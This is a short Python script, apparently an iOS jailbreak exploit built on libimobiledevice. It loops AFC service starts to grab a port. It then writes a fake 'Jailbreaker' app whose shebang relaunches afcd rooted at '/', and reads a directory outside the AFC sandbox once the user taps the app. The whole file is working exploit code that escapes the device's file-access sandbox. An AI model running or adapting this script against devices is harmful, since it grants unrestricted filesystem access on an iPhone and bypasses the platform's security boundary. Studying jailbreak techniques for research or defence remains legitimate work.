#!/usr/bin/python

from imobiledevice import *

def get_lockdown():
	while True:
		try:
			return LockdownClient(iDevice())
		except:
			pass

def get_afc(ld):
	while True:
		try:
			return ld.get_service_client(AfcClient)
		except:
			pass

ld = get_lockdown()

num = 0

while True:
	try:
		descriptor = ld.start_service(AfcClient)
		port = descriptor.port
		
		print(num)
		
		num += 1
	except:
		break

afc = get_afc(ld)

with afc.open("/Downloads/Jailbreaker.app/Jailbreaker", mode="w") as executable:
	executable.write("#!/usr/libexec/afcd -S -d / -p " + str(port) + " # -- ")

print("Port: " + str(port))

print("Click iiit")

while True:
	try:
		afc_unrestricted = AfcClient(iDevice(), descriptor)
		
		print(afc_unrestricted.read_directory("/var/mobile/Library/Logs"))
		
		break
	except:
		pass
